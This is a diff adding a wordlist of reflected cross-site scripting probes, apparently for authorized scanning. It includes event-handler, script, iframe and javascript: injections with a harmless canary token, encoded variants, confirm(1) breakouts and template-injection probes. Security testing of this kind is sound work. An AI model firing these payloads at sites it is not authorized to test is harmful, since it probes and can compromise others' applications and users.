@@ -1,0 +1,20 @@
+# Reflection probes — one param at a time; authorized targets only.
+# Canary token XSSCANARY helps spot partial encoding.
+XSSTESTCANARY
+"><img src=x onerror=XSSCANARY>
+'"><svg/onload=XSSCANARY>
+\"><script>XSSCANARY</script>
+javascript:XSSCANARY
+<img src=x onerror=XSSCANARY>
+<body onload=XSSCANARY>
+{{7*7}}
+${7*7}
+<test XSSCANARY />
+"><iframe srcdoc="<script>XSSCANARY</script>">
+';confirm(1)//
+\";confirm(1)//
+%3Cimg%20src=x%20onerror%3DXSSCANARY%3E
+&lt;img src=x onerror=XSSCANARY&gt;
+&#60;img src=x onerror=XSSCANARY&#62;
+<marquee onstart=XSSCANARY>
+<svg><animate onbegin=XSSCANARY attributeName=x dur=1s>
